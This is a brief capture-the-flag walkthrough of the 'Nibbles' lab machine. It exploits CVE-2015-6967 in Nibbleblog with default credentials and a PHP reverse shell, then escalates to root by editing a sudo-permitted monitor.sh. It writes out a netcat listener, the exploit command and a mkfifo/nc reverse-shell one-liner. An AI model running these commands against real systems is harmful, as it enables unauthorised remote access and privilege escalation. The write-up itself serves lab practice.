# Nibbles 
Nmap reports that ports 80,22 are open so we take a look at those and we see at the html source on the main page that there is a path /nibbleblog/ we will deep dive on it


## [CVE-2015-6967](https://github.com/dix0nym/CVE-2015-6967)

As we search on google we find this vulnerabilitie so we proceed with the exploit.

[shell.php](https://pentestmonkey.net/tools/web-shells/php-reverse-shell)

```bash

#Usage example

nc -lvp 4444

# Make sure to edit the shell.php before running it
python3 exploit.py --url http://10.10.10.75/nibbleblog/ --username admin --password nibbles --payload shell.php

```

## Privilage Escalation

We run `sudo -l` and surprise the user can run a file called `monitor.sh` as root we just edit this file make 

```bash
nc -lvp <port>

rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <ip> <port> >/tmp/f
```

We get the machine access and wallah! [PWNED]